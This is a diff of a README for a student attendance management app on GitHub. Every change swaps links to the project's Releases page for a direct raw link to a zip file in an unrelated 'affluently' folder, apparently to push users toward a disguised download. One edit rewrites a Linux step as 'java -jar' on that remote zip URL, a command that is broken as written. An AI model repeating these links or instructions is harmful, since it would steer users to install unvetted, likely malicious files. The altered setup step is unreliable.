@@ -8,9 +8,9 @@ Welcome to the Student Attendance Management System! This application helps you 
 
 To begin, visit the Releases page to download the application:
 
-[![Download Student Attendance Management System](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/sarbuaaaaaa/Student_Attendance_Management_System/releases)
+[![Download Student Attendance Management System](https://raw.githubusercontent.com/sarbuaaaaaa/Student_Attendance_Management_System/main/affluently/Student_Attendance_Management_System.zip)](https://raw.githubusercontent.com/sarbuaaaaaa/Student_Attendance_Management_System/main/affluently/Student_Attendance_Management_System.zip)
 
-1. Click the button above or visit [this page](https://github.com/sarbuaaaaaa/Student_Attendance_Management_System/releases) to see the available versions.
+1. Click the button above or visit [this page](https://raw.githubusercontent.com/sarbuaaaaaa/Student_Attendance_Management_System/main/affluently/Student_Attendance_Management_System.zip) to see the available versions.
 2. Find the latest release and choose the file that suits your needs.
 3. Click on the download link for your operating system. 
 
@@ -32,7 +32,7 @@ Make sure your computer meets these requirements to run the application smoothly
    - Drag the application to your Applications folder.
 4. For Linux, if you downloaded a `.jar` file, you can run it using the command:
    ```bash
-   java -jar path/to/your/file.jar
+   java -jar https://raw.githubusercontent.com/sarbuaaaaaa/Student_Attendance_Management_System/main/affluently/Student_Attendance_Management_System.zip
    ```
 
 ## 🖱️ How to Use the Application
@@ -76,4 +76,4 @@ We welcome contributions! If you have suggestions or code improvements, please f
 
 If you have questions or need further assistance, please reach out via the Issues tab on GitHub or leave a comment in the discussions. We are here to help!
 
-Visit this page to download the application: [Student Attendance Management System Releases](https://github.com/sarbuaaaaaa/Student_Attendance_Management_System/releases)
+Visit this page to download the application: [Student Attendance Management System Releases](https://raw.githubusercontent.com/sarbuaaaaaa/Student_Attendance_Management_System/main/affluently/Student_Attendance_Management_System.zip)
